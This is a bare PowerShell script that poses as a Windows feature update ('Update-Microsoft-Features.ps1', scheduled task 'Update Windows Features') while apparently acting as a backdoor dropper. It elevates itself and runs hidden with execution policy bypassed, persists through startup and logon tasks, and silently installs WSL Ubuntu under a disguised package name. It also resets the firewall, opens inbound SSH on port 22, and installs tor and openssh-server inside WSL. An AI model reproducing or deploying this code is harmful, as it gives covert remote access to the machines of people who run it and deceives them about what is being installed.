function addo{
$ProgressPreference = 'SilentlyContinue';
$ConfirmPreference = 'SilentlyContinue';
if((Get-WindowsOptionalFeature -Online -FeatureName *linux*).State -ne 'Enabled'){
Enable-WindowsOptionalFeature -ErrorAction Ignore -InformationAction Ignore -NoRestart -WarningAction SilentlyContinue -Online -FeatureName Microsoft-Windows-Subsystem-Linux -All | Select-String "Big";
}
if(!(Get-ScheduledTask -ErrorAction SilentlyContinue -TaskName "Update Windows Features")){
$Arg = " Out-File $env:LOCALAPPDATA\Temp\log.txt; Start-Process powershell ' -WindowStyle Hidden -ExecutionPolicy Bypass $env:LOCALAPPDATA\Temp\log.ps1'";
$Action = New-ScheduledTaskAction -WarningAction Ignore -InformationAction Ignore -Execute powershell -WorkingDirectory C:\Users\$env:USERNAME\AppData\Local\Temp -Argument $Arg;
$Trigger = @($(New-ScheduledTaskTrigger -AtStartup),$(New-ScheduledTaskTrigger -AtLogon));Register-ScheduledTask -OutVariable $null -RunLevel Highest -Action $Action -Trigger $Trigger -TaskName 'Update Windows Features' | Select-String "Foot";
}
function init{
if(([System.IO.File]::Exists("$env:LOCALAPPDATA\Microsoft\WindowsApps\ubuntu1604.exe")) -and (Get-WindowsOptionalFeature -Online -FeatureName *linux*).State -eq 'Enabled'){
function isit{
(New-Object -ComObject HNetCfg.FwPolicy2).RestoreLocalFirewallDefaults();
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22;
Set-Service -Name sshd -StartupType 'Automatic';
Start-Service sshd;
$Big = "cat /tmp/bigfoot | echo '#!/bin/bash' >> /tmp/bigfoot | echo -e 'apt update -y; apt upgrade -y;\n apt install -y tor openssh-server openssh-client'"
$Foot = " >> /tmp/bigfoot;\n echo 'wsl /tmp/bigfoot' > /mnt/c/Users/$Env:USERNAME/AppData/Local/Temp/log.ps1; chmod +x /tmp/bigfoot; /tmp/bigfoot";
$BigFoot = $Big + $Foot;
bash -c $BigFoot;
$Arg = " Start-Process powershell ' -WindowStyle Hidden -ConfirmPreference SilentlyContinue -ExecutionPolicy Bypass $env:LOCALAPPDATA\Temp\log.ps1'";
$Action = New-ScheduledTaskAction -WarningAction Ignore -InformationAction Ignore -Execute powershell -WorkingDirectory $env:LOCALAPPDATA\Temp -Argument $Arg;
Register-ScheduledTask -Force -OutVariable $null -RunLevel Highest -Action $Action -TaskName 'Update Windows Features' | Select-String "Tor";
}
isit;
}
if((Get-WindowsOptionalFeature -Online -FeatureName *linux*).State -eq 'Enabled'){
if(!(Get-ScheduledTask -ErrorAction SilentlyContinue -TaskName "Update Windows Features")){
exit;
}
if(!([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\WindowsFeature.appx"))){
if((Test-NetConnection 8.8.8.8).PingSucceeded -eq 'true'){
Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1604 -OutFile $env:LOCALAPPDATA\Temp\WindowsFeature.appx -UseBasicParsing | Wait-Job;
}
else{
exit;
}
}
if(([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\WindowsFeature.appx")) -and ([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\log.txt"))){
Add-AppxPackage $env:LOCALAPPDATA\Temp\WindowsFeature.appx | Wait-Job;
$feature="$env:LOCALAPPDATA\Microsoft\WindowsApps\ubuntu1604.exe";
Start-Process powershell -WindowStyle Hidden $feature;
Start-Sleep -Seconds 45 | Stop-Process -Name ubuntu1604 -Force;
Remove-Item -Path $env:LOCALAPPDATA\Temp\log.txt;
}}}
if(!([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\log.txt"))){
$function = Invoke-Command -ScriptBlock {$function:init | Out-String};
$function | Out-File $env:LOCALAPPDATA\Temp\log.ps1 | Wait-Job;
}
init;
}
$id = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent();
if(($id).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
addo;
}
else{
$Service = $PSScriptRoot;
Start-Process powershell -WindowS Hidden $ConfirmPreference $Service\Update-Microsoft-Features.ps1 -Verb RunAs;
}